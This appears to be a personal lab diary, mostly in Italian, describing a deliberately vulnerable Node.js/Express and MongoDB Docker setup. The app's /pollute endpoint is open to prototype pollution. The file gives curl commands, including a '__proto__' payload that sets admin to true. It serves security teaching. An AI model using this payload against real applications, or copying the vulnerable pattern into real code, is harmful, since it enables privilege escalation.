### Take this file as my diares, everything will be ordered after the infrastructure is complete
### Step 1: node+mongodb (prototype pollution) 
### Descrizione dell'infrastruttura
- **Docker Compose:** Definisce due servizi: 
  - `node`: Container che esegue l'applicazione Node.js vulnerabile, costruito utilizzando il file `Dockerfile.node` e mappato sulla porta 3000.
  - `mongo`: Container che esegue MongoDB, mappato sulla porta 27017 (in questo laboratorio serve come backend di esempio).
- **Dockerfile.node:** Specifica l'immagine base `node:14`, copia il codice sorgente (inclusi `package.json` e `index.js`), installa le dipendenze e imposta il comando per avviare l'applicazione (`npm start`).
- **Applicazione Node.js:** 
  - `index.js` definisce un server Express con due endpoint: 
    - **GET /check:** Restituisce il valore della proprietà `admin` dell'oggetto globale (`{}.admin`).
    - **POST /pollute:** Endpoint vulnerabile che, se il payload contiene `__proto__`, estende `Object.prototype` con i valori forniti.

### Descrizione delle vulnerabilità
- **Prototype Pollution:** 
  - L'applicazione non valida correttamente l'input dell'utente nell'endpoint `/pollute`, permettendo di modificare il prototipo globale (`Object.prototype`). 
  - Questo può portare a comportamenti imprevisti in tutta l'applicazione, poiché ogni oggetto eredita ora le proprietà modificate.
- *(Altre vulnerabilità come SSRF, attacchi a Redis e privilege escalation sono menzionate a scopo didattico ma non implementate in questo laboratorio.)*

### Descrizione dell'attacco (completo di comandi da usare)
1. **Avvio dell'infrastruttura:**
   ```bash
   docker compose up --build -d
```

2. **Verifica iniziale dello stato:**
```bash
curl http://localhost:3000/check

#output atteso {}% 
```

3. **Attacco prototype pollution:**
```bash
curl -X POST http://localhost:3000/pollute \
  -H "Content-Type: application/json" \
  -d '{ "__proto__": { "admin": true } }'
```

4. **Verifica effetto:**
```bash
curl http://localhost:3000/check

#output atteso {"admin":true}%     
```

